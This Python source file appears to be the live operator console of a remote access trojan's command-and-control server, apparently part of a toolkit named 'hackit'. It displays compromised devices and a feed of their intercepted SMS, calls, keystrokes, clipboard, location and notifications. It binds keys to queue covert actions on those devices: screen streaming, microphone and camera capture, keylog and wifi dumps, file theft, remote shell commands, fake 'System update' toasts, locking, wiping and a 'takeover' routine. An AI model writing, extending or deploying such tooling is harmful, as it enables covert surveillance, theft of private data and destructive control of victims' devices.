"""Live operator UI: a full-screen terminal that fills itself from the C2.

Devices on the left, events on the right, keystrokes and session state below,
one command line at the bottom. Every pane is built at a fixed width and joined
side by side, so a long label truncates inside its column instead of wrapping
over the next one. The listener runs on its own thread, so the screen never
blocks a beacon and a slow disk never freezes the feed. Without a TTY it
degrades to one rendered block per input line.
"""
from __future__ import annotations

import asyncio
import json
import os
import threading
import time
from typing import Dict, List, Optional

from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_RED, B_WHITE, B_YELLOW, DIM, GREEN

from . import protocol, server, store, term
from .server import Hub, make_app

KIND_COLOR = {
    "keylog": B_MAGENTA,
    "sms": B_CYAN,
    "call": B_CYAN,
    "notif": B_WHITE,
    "loc": B_GREEN,
    "cam": B_YELLOW,
    "mic": B_YELLOW,
    "clip": B_WHITE,
    "probe": DIM,
    "info": DIM,
    "native": DIM,
    "register": GREEN,
    "takeover": B_MAGENTA,
    "shell": B_RED,
}

HELP = [
    ("devices", "1-9 pick · j / k move · Enter inspect"),
    ("capture", "s screenshot · v stream on/off · m mic 15s · c photo"),
    ("intel", "i info · l fix · g keylog · a apps · u usage · w wifi · p perms"),
    ("files", "f <dir> list · P <path> pull"),
    ("control", "x <cmd> shell · t <msg> toast · b buzz · T re-takeover · K lock · W wipe"),
    ("session", "r refresh · h help · q quit (Ctrl-C also)"),
]

FOOTER = "1-9 pick · s shot · m mic · c cam · g keylog · x shell · T takeover · h help · q quit"


class LiveUI:
    def __init__(self, host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
        self.hub = Hub(psk=psk, token="operator", public_url=public_url, udp_port=udp_port)
        self.host = host
        self.port = port
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._serve, name="c2", daemon=True)
        self.sessions: List[dict] = []
        self.index = 0
        self.feed: List[tuple] = []
        self.keys: List[str] = []
        self.tasks: Dict[int, str] = {}
        self.seen_events: Dict[str, int] = {}
        self.message = ""
        self.started = time.time()
        self.width = 100
        self.height = 32
        self.helping = False
        self.last_frame: Optional[str] = None
        self.flash: Optional[str] = None

    # ------------------------------------------------------------- server
    def _serve(self) -> None:
        from aiohttp import web

        asyncio.set_event_loop(self.loop)
        app = make_app(self.hub)

        async def boot() -> None:
            runner = web.AppRunner(app, access_log=None)
            await runner.setup()
            site = web.TCPSite(runner, self.host, self.port)
            await site.start()

        self.loop.create_task(boot())
        self.loop.run_forever()

    def start(self) -> None:
        self.thread.start()
        time.sleep(0.3)
        self.refresh()

    # -------------------------------------------------------------- state
    def current(self) -> Optional[dict]:
        if not self.sessions:
            return None
        self.index = max(0, min(self.index, len(self.sessions) - 1))
        return self.sessions[self.index]

    def refresh(self) -> None:
        store.mark_offline(self.hub.offline_after)
        self.sessions = store.sessions()
        self.sessions.sort(key=lambda r: (not r["online"], -r["last_seen"]))
        session = self.current()
        if not session:
            return
        sid = session["sid"]
        last = self.seen_events.get(sid, 0)
        for event in store.events(sid, after_id=last, limit=40):
            self.seen_events[sid] = event["id"]
            stamp = time.strftime("%H:%M:%S", time.localtime(event["ts"]))
            self.feed.append((stamp, event["kind"], term.trunc(_summarize(event["kind"], event["body"]), 160)))
        del self.feed[:-80]
        for task in store.tasks(sid, 12):
            state = task["state"]
            if self.tasks.get(task["id"]) != state and state != "queued":
                self.tasks[task["id"]] = state
                if task.get("output"):
                    self.feed.append((time.strftime("%H:%M:%S"), "out:" + task["cmd"],
                                      term.trunc(str(task["output"]), 160)))
        for row in store.keylogs(sid, 0, 200)[-40:]:
            line = f"[{row['package']}] {row['text']}"
            if line not in self.keys:
                self.keys.append(line)
        del self.keys[:-40]

    def queue(self, cmd: str, args: Optional[List[str]] = None) -> None:
        session = self.current()
        if not session:
            self.message = "no device selected"
            return
        if not protocol.allowed(cmd, _spec_modules(session)):
            self.message = f"{cmd} is not in spec '{session.get('spec', 'rat')}'"
            return
        try:
            task_id = store.queue_task(session["sid"], cmd, args or [])
        except protocol.ProtocolError as exc:
            self.message = str(exc)
            return
        self.hub.wake(session["sid"])
        self.message = f"queued #{task_id} {cmd}"

    def takeover(self) -> None:
        session = self.current()
        if not session:
            self.message = "no device selected"
            return
        sid = session["sid"]
        store.release_takeover(sid)
        queued = server.auto_takeover(self.hub, sid)
        self.hub.wake(sid)
        self.message = f"takeover re-queued ({queued} steps)"

    # ------------------------------------------------------------- render
    def _header(self) -> List[str]:
        uptime = int(time.time() - self.started)
        online = sum(1 for s in self.sessions if s["online"])
        left = term.Bad + " ● HACKIT · RAT " + term.RESET + term.Dim + term.trunc(
            self.hub.public_url, max(10, self.width // 2 - 12)) + term.RESET
        right = (f"up {uptime // 60:02d}:{uptime % 60:02d}  "
                 f"{_colored(str(online), GREEN if online else DIM)}/{len(self.sessions)} online  "
                 f"{len(self.feed)} ev")
        return [term.pad(left, max(0, self.width - term.vislen(right))) + term.Dim + right + term.RESET,
                term.rule(self.width, "═", term.Frame)]

    def _devices(self, width: int, height: int) -> List[str]:
        rows: List[str] = []
        if not self.sessions:
            rows = [
                term.Dim + "waiting for the first beacon…" + term.RESET,
                term.Dim + "build: make app" + term.RESET,
                term.Dim + "deliver: inject / make stager" + term.RESET,
            ]
        label_w = max(6, width - 14)
        for i, row in enumerate(self.sessions[:9]):
            mark = term.Good + "▸" + term.RESET if i == self.index else " "
            dot = term.Good + "●" + term.RESET if row["online"] else term.Dim + "○" + term.RESET
            spec = (row.get("spec") or "rat")[:7]
            rows.append(f"{mark}{dot} {term.Accent}{term.pad(spec, 7)}{term.RESET}"
                        f" {term.trunc(row['label'], label_w)}")
            batt = int(row.get("battery") or 0)
            model = (row.get("model") or "?")[:16]
            bar = "█" * max(1, batt // 14) if batt else "▏"
            rows.append(f"   {term.Dim}{term.trunc(model, 14)} {bar} {batt}%"
                        f"{'⚡' if row.get('charging') else ''}{term.RESET}")
        return term.box("DEVICES", rows, width, term.Frame, height)

    def _feed(self, width: int, height: int) -> List[str]:
        rows: List[str] = []
        room = max(8, width - 17)
        if not self.feed:
            rows.append(term.Dim + "waiting for events…" + term.RESET)
        for stamp, kind, body in self.feed[-(height - 2):]:
            color = KIND_COLOR.get(kind, DIM)
            label = kind[:7] if not kind.startswith("out:") else "out"
            rows.append(f"{term.Dim}{stamp}{term.RESET} {color}{term.pad(label, 7)}{term.RESET}"
                        f" {term.trunc(body, room)}")
        return term.box("LIVE FEED", rows, width, term.Ink, height)

    def _keys(self, width: int, height: int) -> List[str]:
        session = self.current()
        title = f"KEYSTROKES · {session['label'][:12]}" if session else "KEYSTROKES"
        rows: List[str] = []
        if not self.keys:
            rows.append(term.Dim + "nothing captured yet" + term.RESET)
        for line in self.keys[-(height - 2):]:
            rows.append(term.trunc(line, width - 4))
        return term.box(title, rows, width, term.Accent, height)

    def _status(self, width: int, height: int) -> List[str]:
        session = self.current()
        rows: List[str] = []
        if not session:
            rows.append(term.Dim + "select a device with 1-9" + term.RESET)
        else:
            loc = store.locations(session["sid"], 1)
            tasks = store.tasks(session["sid"], 4)
            rows.append(f"{term.Dim}sid{term.RESET} {term.trunc(session['sid'], width - 6)}")
            rows.append(f"{term.Dim}ip {term.RESET} {session.get('pub_ip') or '-'}"
                        f"  {term.Dim}sdk{term.RESET} {session.get('sdk') or '?'}")
            if loc:
                rows.append(f"{term.Dim}fix{term.RESET} {loc[0]['lat']:.4f}, {loc[0]['lon']:.4f}"
                            f" ±{int(loc[0]['accuracy'] or 0)}m")
            else:
                rows.append(f"{term.Dim}fix{term.RESET} —")
            if tasks:
                rows.append(" ".join(f"{t['cmd']}:{t['state'][:4]}" for t in tasks))
            if self.last_frame:
                rows.append(f"{term.Dim}screen{term.RESET} {term.trunc(self.last_frame, width - 10)}")
        return term.box("STATUS", rows, width, term.Frame, height)

    def render(self) -> str:
        self.width, self.height = term.size()
        lines = self._header()
        bottom = self.height >= 26
        body_h = max(6, self.height - (15 if bottom else 6))
        if self.helping:
            rows: List[str] = []
            for group, text in HELP:
                rows.append(term.Accent + term.pad(group, 9) + term.RESET + " " + text)
            lines += term.box("HELP — raw commands also work (e.g. sms_dump 50)", rows,
                              self.width, term.Frame, len(rows) + 1)
            lines.append(term.Dim + "  any key returns" + term.RESET)
            return "\n".join(lines)

        if self.width >= 104:
            left = min(34, max(24, self.width // 4))
            right = self.width - left
            lines += term.horizontal(
                self._devices(left, body_h),
                self._feed(right, body_h),
            )
        else:
            available = max(6, self.height - (17 if bottom else 8))
            top = max(2, available // 3)
            lines += self._devices(self.width, top)
            lines += self._feed(self.width, available - top)

        lines.append(term.rule(self.width, "─", term.Dim))
        if bottom:
            half = self.width // 2
            lines += term.horizontal(
                self._keys(half, 7),
                self._status(self.width - half, 7),
            )
        if self.flash:
            lines.append(term.Warn + " ► " + term.trunc(self.flash, self.width - 3) + term.RESET)
            self.flash = None
        elif self.message:
            lines.append(term.Warn + " ► " + term.trunc(self.message, self.width - 3) + term.RESET)
            self.message = ""
        else:
            lines.append(term.Dim + " ► " + term.trunc(FOOTER, self.width - 3) + term.RESET)
        return "\n".join(lines)

    # -------------------------------------------------------------- input
    def handle(self, line: str) -> bool:
        parts = line.split()
        if not parts:
            self.refresh()
            return True
        verb = parts[0]
        key = verb if len(verb) == 1 else verb.lower()
        args = parts[1:]
        if key in ("q", "quit", "exit"):
            return False
        if key in ("h", "?", "help"):
            self.helping = not self.helping if key == "h" else True
            return True
        if key in ("j", "k") or (len(key) == 1 and key.isdigit()):
            if key == "j":
                self.index = min(self.index + 1, max(0, len(self.sessions) - 1))
            elif key == "k":
                self.index = max(self.index - 1, 0)
            else:
                self.index = max(0, min(int(key) - 1, max(0, len(self.sessions) - 1)))
            self.refresh()
            return True
        if key == "r":
            self.refresh()
            return True
        if key == "T":
            self.takeover()
            return True
        if key == "K":
            self.queue("lock")
            return True
        if key == "W":
            self.queue("wipe")
            return True
        if key == "s":
            self.queue("screenshot")
        elif key == "v":
            session = self.current()
            if session and self.last_frame:
                self.last_frame = None
                self.queue("screen_stop")
            else:
                self.queue("screen_start")
                if session:
                    self.last_frame = f"{self.hub.public_url}/v1/live/{session['sid']}"
        elif key == "m":
            self.queue("mic_rec", ["15"])
        elif key == "c":
            self.queue("cam_shot")
        elif key == "i":
            self.queue("info")
        elif key == "p":
            self.queue("perm_status")
        elif key == "l":
            self.queue("loc")
        elif key == "g":
            self.queue("keylog_dump")
        elif key == "a":
            self.queue("apps")
        elif key == "u":
            self.queue("usage", ["7"])
        elif key == "w":
            self.queue("wifi_dump")
        elif key == "f":
            self.queue("files_ls", [" ".join(args) or "."])
        elif key == "P":
            self.queue("files_pull", [" ".join(args)])
        elif key == "x":
            self.queue("shell", [" ".join(args)])
        elif key == "t":
            self.queue("toast", [" ".join(args) or "System update"])
        elif key == "b":
            self.queue("vibrate", ["600"])
        else:
            self.queue(verb.lower(), args)
        return True

    def run(self) -> None:
        interactive = os.isatty(0) and os.isatty(1)
        if not interactive:
            while True:
                try:
                    line = input("rat> ")
                except EOFError:
                    return
                self.refresh()
                print(self.render())
                if not self.handle(line):
                    return
        import select
        import sys
        import termios
        import tty

        fd = sys.stdin.fileno()
        saved = termios.tcgetattr(fd)
        buffer = ""
        try:
            tty.setraw(fd)
            while True:
                os.write(1, b"\x1b[2J\x1b[H")
                os.write(1, self.render().encode("utf-8", "replace"))
                self.refresh()
                ready, _, _ = select.select([fd], [], [], 1.0)
                if not ready:
                    continue
                data = os.read(fd, 32).decode("utf-8", "replace")
                for char in data:
                    if char in ("\x03", "\x04"):
                        raise KeyboardInterrupt
                    if char in ("\r", "\n"):
                        line = buffer.strip()
                        buffer = ""
                        if line and not self.handle(line):
                            return
                        continue
                    if char == "q" and not buffer:
                        raise KeyboardInterrupt
                    if char in ("\x7f", "\b"):
                        buffer = buffer[:-1]
                        continue
                    if char == "\x1b":
                        continue
                    buffer = (buffer + char)[:120]
                os.write(1, f"\x1b[{self.height - 1};1H\x1b[2K rat> {buffer}".encode())
        except KeyboardInterrupt:
            pass
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, saved)


def _summarize(kind: str, body: str) -> str:
    """One readable line per event kind, no raw JSON walls."""
    try:
        data = json.loads(body)
    except Exception:
        return term.trunc(body, 300)
    if kind == "sms" and isinstance(data, list):
        return " | ".join(f"{row.get('from', '?')}: {row.get('body', '')}" for row in data[:2])
    if kind == "call" and isinstance(data, list):
        return " | ".join(f"{row.get('number', '?')} ({row.get('name', '') or 'unknown'}) "
                          f"{row.get('duration', 0)}s" for row in data[:2])
    if kind == "loc" and isinstance(data, list) and data:
        row = data[0]
        return f"{row.get('lat')},{row.get('lon')} ±{row.get('acc', '?')} {row.get('src', '')}"
    if kind == "keylog" and isinstance(data, list):
        return " ".join(str(r.get("text", "")) for r in data[:3] if isinstance(r, dict))
    if kind == "notif" and isinstance(data, dict):
        return f"{data.get('pkg', '')}: {data.get('title', '')} {data.get('text', '')}".strip()
    if kind == "clip":
        text = data.get("text") if isinstance(data, dict) else data
        return str(text)[:200]
    if kind == "takeover":
        return f"takeover ran · {data.get('steps') if isinstance(data, dict) else '?'} steps"
    if isinstance(data, dict):
        for key in ("name", "path", "pkg", "cmd"):
            if key in data:
                return str(data[key])
    return term.trunc(body, 300)


def _spec_modules(session: dict) -> Optional[List[str]]:
    from . import builder
    spec = session.get("spec") or "rat"
    return sorted(set(builder.CORE_MODULES + builder.SPECS.get(spec, [])))


def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) -> None:
    store.init()
    live = LiveUI(host, port, psk, public_url, udp_port)
    live.start()
    try:
        live.run()
    finally:
        print(_colored("\n  listener stopped", DIM))
